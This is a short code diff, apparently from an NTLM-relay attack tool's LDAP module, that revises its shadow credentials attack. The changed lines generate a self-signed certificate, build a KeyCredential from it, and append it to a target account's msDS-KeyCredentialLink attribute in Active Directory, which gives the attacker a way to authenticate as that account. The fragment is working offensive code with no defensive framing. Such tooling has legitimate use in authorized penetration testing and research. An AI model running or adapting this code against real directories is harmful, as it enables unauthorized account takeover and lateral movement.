@@ -282,10 +282,10 @@ class LDAPAttack(ProtocolAttack):
             LOG.info("Target user found: %s" % target_dn)
 
         LOG.info("Generating certificate")
-        certificate,publicKey,key = shadow_credentials.createX509Certificate(subject=currentShadowCredentialsTarget, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+        certificate,key = shadow_credentials.createSelfSignedX509Certificate(subject=currentShadowCredentialsTarget, notBefore=(-40 * 365), notAfter=(40 * 365))
         LOG.info("Certificate generated")
         LOG.info("Generating KeyCredential")
-        keyCredential = shadow_credentials.CreateKeyCredentialFromX509Certificate(publicKey, deviceId=shadow_credentials.getRandomGUID(), owner=target_dn, currentTime=shadow_credentials.getTimeTicks())
+        keyCredential = shadow_credentials.CreateKeyCredentialFromX509Certificate(certificate,key,deviceId=shadow_credentials.getDeviceId(),currentTime=shadow_credentials.getTicksNow())
         #LOG.info("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
         #LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
         self.client.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
@@ -298,7 +298,7 @@ class LDAPAttack(ProtocolAttack):
             LOG.error('Could not query target user properties')
             return
         try:
-            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential, target_dn )]
+            new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [shadow_credentials.toDNWithBinary2String( keyCredential.dumpBinary(), target_dn )]
             LOG.info("Updating the msDS-KeyCredentialLink attribute of %s" % currentShadowCredentialsTarget)
             self.client.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
             if self.client.result['result'] == 0:
